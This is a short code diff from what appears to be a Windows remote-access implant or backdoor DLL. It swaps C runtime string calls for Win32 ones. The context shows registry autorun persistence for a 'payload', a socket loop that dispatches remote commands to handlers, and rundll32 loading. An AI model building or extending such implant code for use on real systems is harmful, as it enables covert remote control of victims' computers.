@@ -86,7 +86,7 @@ BOOL AutorunRemove(void)
             &dwType, (PBYTE)lpszValue, &dwDataSize) == ERROR_SUCCESS)
         {
             // check for the payload autorun key
-            if (dwType == REG_SZ && !strcmp(lpszValue, lpszCommandLine))
+            if (dwType == REG_SZ && !lstrcmp(lpszValue, lpszCommandLine))
             {
                 // delete aurorun entry
                 if (RegDeleteValue(hKey, szValueName) == ERROR_SUCCESS)
@@ -662,7 +662,7 @@ DWORD RemoteCommunicate(SOCKET s)
         // dispatch command
         for (p = 0; m_PayloadCommands[p].lpszCommand != NULL; p += 1)
         {
-            if (!strcmp(m_PayloadCommands[p].lpszCommand, lpszCommand))
+            if (!lstrcmp(m_PayloadCommands[p].lpszCommand, lpszCommand))
             {
                 dwRet = m_PayloadCommands[p].Handler(s, lpszArgs);
                 bHandled = TRUE;
@@ -1804,7 +1804,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, ULONG_PTR lpRes
 
         GetModuleFileName(GetModuleHandle(NULL), m_szPath, MAX_PATH);
 
-        if (strstr(m_szPath, "rundll32.exe") != NULL)
+        if (StrStr(m_szPath, "rundll32.exe") != NULL)
         {
             // don't call main function, rundll32 will do it
             return TRUE;
